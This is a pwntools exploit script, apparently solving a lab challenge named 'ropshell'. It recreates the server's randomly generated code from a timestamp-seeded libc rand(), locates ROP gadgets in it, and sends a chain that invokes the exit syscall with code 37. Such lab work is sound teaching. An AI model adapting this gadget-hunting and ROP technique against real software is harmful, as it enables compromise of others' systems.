#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
import subprocess
libc = ctypes.CDLL('libc.so.6')

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

context.arch = 'amd64'
# asm_test = asm("""
#             mov rax, 60
#             ret
#             """)
# print(asm_test)
# r.sendline(asm_test)
s = r.recvuntil("second(s)").decode().split()
print("s", s)
timestamp = int(s[3])
code_loc = int(s[9], 0)
# timestamp = int(timestamp)
print("timestamp",timestamp, type(timestamp))
# p1 = subprocess.Popen(["./calculate", timestamp], stdout=subprocess.PIPE)
# print("debug")
# for line in iter(p1.stdout.readline,""):
#      print(line)
LEN_CODE = 10*0x10000
codecontent = []
libc.srand(timestamp)
# for i in range(0, LEN_CODE):
#     codecontent.append(0)
# print("code content size", len(codecontent))
for i in range(int(LEN_CODE/4)):
    
    temp = (libc.rand()<<16) | (libc.rand() & 0xffff);
    temp &= 0xffffffff
    codecontent.append(temp)
print("debug")
codecontent[libc.rand() % (int(LEN_CODE/4) - 1)] = 0xc3050f
print("debug1")
code_bytes = b''
for single_int in codecontent:
    bytes_arr = single_int.to_bytes(4, byteorder='little')
    code_bytes += bytes_arr
    # print("code bytes", code_bytes)
# print(codecontent)
# print("bytes array", bytearray(codecontent))
# print("bytes array", code_bytes)
print("byte arr type", type(code_bytes))
print("off set at codebytes", code_bytes.find(asm("""
            pop rax
            ret
            """)), code_bytes.find(asm("""
                    pop rax
                    ret
                    """)), code_bytes.find(asm("""
                      syscall
                      ret
                      """)))
print("code loc", hex(code_loc))
print(hex(code_loc + code_bytes.find(asm("""
                    pop rax
                    ret
                    """))), type(hex(code_loc + code_bytes.find(asm("""
                    pop rax
                    ret
                    """)))))
buf = b''.join([p64(code_loc + code_bytes.find(asm("""
                    pop rax
                    ret
                    """))),p64(60),
       p64(code_loc + code_bytes.find(asm("""
                      pop rdi
                      ret
                      """))), p64(37),
       p64(code_loc + code_bytes.find(asm("""
                      syscall
                      ret
                      """)))]
       
       )
r.send(buf)
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
